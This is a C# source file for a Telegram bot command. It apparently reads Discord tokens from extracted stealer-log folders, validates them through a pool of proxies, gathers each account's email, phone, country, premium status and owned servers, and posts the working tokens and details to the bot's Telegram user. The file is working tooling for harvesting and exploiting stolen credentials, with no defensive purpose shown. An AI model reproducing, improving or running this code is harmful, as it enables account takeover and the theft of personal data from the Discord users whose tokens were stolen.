using System.Text;

using Bot.Core.Models;
using Bot.Core.Models.Checkers.Abstractions;
using Bot.Core.Models.Commands.Abstractions;
using Bot.Core.Models.Parsers.Abstractions;
using Bot.Services.Discord.Models;
using Bot.Services.Proxies.Services;

using Injectio.Attributes;

using Newtonsoft.Json;

using TL;

using WTelegram;

namespace Bot.Telegram.Commands.User.Services {
	[RegisterTransient<ICommand<UpdateBotCallbackQuery>>(ServiceKey = Keys.Services.DiscordCallback)]
	public class Discord(Client client, Proxies proxies, IParserStream<Account> parser, IChecker<Account> checker, IConfiguration config, ILogger<Discord> logger) : ICommand<UpdateBotCallbackQuery> {
		public Task ExecuteAsync(UpdateBotCallbackQuery update, TL.User user) {
			var name = Encoding.UTF8.GetString(update.data[1..]);
			var path = Path.Combine(config["Files:Root"], "Extracted", name);
			
			Task.Factory.StartNew(
				async () => {
					if (!Directory.Exists(path)) {
						return;
					}

					logger.LogInformation("[Discord] Parsing tokens");
					var tokens = await parser.FromLogs(path).ToListAsync();
					
					logger.LogInformation("[Discord] Taking proxy");
					var proxy_list = await proxies.TakeAsync(10).ToListAsync(); // TODO change with MaxThreads

					logger.LogInformation("[Discord] Start processing");
					tokens.WithThreads(
						async (account, index) => {
							if (!await checker.CheckAsync(account, proxy_list[index])) {
								return;
							}

							await checker.DetailsAsync(account, proxy_list[index]);

							var text = $$"""
										 {{account.Username}}

										 Token: `{{account.Token}}`
										 Email: {{(string.IsNullOrEmpty(account.Email) ? "None" : $"`{account.Email}`")}}
										 Phone: {{(string.IsNullOrEmpty(account.Phone) ? "None" : $"`{account.Phone}`")}}
										 Country: {{(string.IsNullOrEmpty(account.CountryCode) ? "Unknown" : account.CountryCode)}}
										 Verified: {{(account.Verified ? "True" : "False")}}
										 Premium: {{account.PremiumType.ToString()}}

										 Guilds: {{account.Guilds.Count}}
										 
										 {{string.Join('\n', account.Guilds.Select(x => $"\tName: {x.Name}\n\tStatus: {(x.IsOwner ? "Owner" : "Member")}\n"))}}
										 """;

#if DEBUG
							logger.LogDebug("[Discord] Try to send: \n{account}\n{content}", JsonConvert.SerializeObject(account, Formatting.Indented), text);
#endif
                            
							MessageEntity[] entities = client.MarkdownToEntities(ref text);
							
							try {
								await client.SendMessageAsync(
									user,
									text,
									media: account.Avatar is not null ? new InputMediaPhotoExternal {
										url = $"https://cdn.discordapp.com/avatars/{account.Id}/{account.Avatar}.webp"
									} : null,
									entities: entities
								);
							} catch {
								await client.SendMessageAsync(
									user,
									text,
									media: new InputMediaPhotoExternal {
										url = $"https://cdn.discordapp.com/avatars/{account.Id}/{account.Avatar}.webp"
									}
								);
							}
						},
						10 // TODO change with MaxThreads
					);
				}
			);

			if (!Directory.Exists(path)) {
				return client.Messages_EditMessage(
					user,
					update.msg_id,
					$"Directory not found: {name}",
					reply_markup: new ReplyInlineMarkup {
						rows = [
							new() {
								buttons = [
									new KeyboardButtonCallback {
										text = "Menu",
										data = [Keys.StartCallback]
									}
								]
							}
						]
					}
				);
			}

			return client.Messages_EditMessage(
				user,
				update.msg_id,
				$"Parsing from {name}",
				reply_markup: new ReplyInlineMarkup {
					rows = [
						new() {
							buttons = [
								new KeyboardButtonCallback {
									text = "Menu",
									data = [Keys.StartCallback]
								}
							]
						}
					]
				}
			);
		}
	}
}